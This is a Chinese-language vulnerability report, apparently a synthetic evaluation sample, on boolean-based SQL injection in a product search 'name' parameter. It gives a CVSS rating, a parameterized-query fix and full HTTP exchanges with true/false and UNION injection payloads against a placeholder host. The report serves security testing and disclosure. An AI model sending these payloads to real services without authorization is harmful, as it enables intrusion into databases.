# 示例系统-商品搜索 name 参数 SQL 注入：真假条件改变查询结果

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  评分 5.3（中危）

## 描述
普通用户搜索 `alpha` 返回一条商品。在 `name` 参数后追加恒真和恒假条件，真条件返回一条、假条件返回零条；两组请求各重复一次，结果相同，表现符合布尔型 SQL 注入特征。UNION 请求返回 400，未取得其他数据；本次未测试依赖字段值的条件。
### 定级依据
需要普通账号；本次只确认真假常量能改变查询结果，没有读取字段值或其他数据。数据读取影响仍需进一步验证。

## 修复建议
将 `name` 参数改为参数化查询，确保输入只按普通值处理，不改变 SQL 语句结构。源码和数据库版本未核实。

## 测试过程
### 发现过程与攻击思路
搜索 `alpha` 得到一条商品。只修改 `name` 参数追加恒真或恒假条件，各发送两次；真条件均返回一条，假条件均返回零条。
### 失败尝试与未验证项
UNION 请求返回 400，未取得额外数据。字段值读取、数据库版本、表结构、写入和命令执行未验证。
### Burp 复现
本次结果来自离线合成报文，未在 Burp Repeater 中复测。建议用授权账号正常登录后捕获搜索请求，只修改 `name` 为真、假条件并比较 `items` 和 `total`。

## 攻击链路
```text
普通用户提交商品搜索关键词
└─ GET /api/products
   └─ name 参数附加真假条件
      ├─ 恒真条件返回 1 条
      └─ 恒假条件返回 0 条
```

## 证据说明
来源为离线合成报文，没有访问真实服务。完整请求与响应按用途附在下方。
### 复测标准
参数化查询生效后，真、假条件文本都应作为普通搜索值处理，不能改变查询结构；比较响应记录数和查询结果。

**完整请求与响应**

**正常搜索**

请求：

```http
GET /api/products?name=alpha HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**再次发送真条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 55

{"items":[{"id":"product-a","name":"alpha"}],"total":1}
```

**再次发送假条件搜索**

请求：

```http
GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 22

{"items":[],"total":0}
```

**UNION 方式搜索**

请求：

```http
GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1
Host: report-eval.invalid
X-Eval-Actor: user-a
Content-Length: 0


```

响应：

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Content-Length: 26

{"error":"query_rejected"}
```
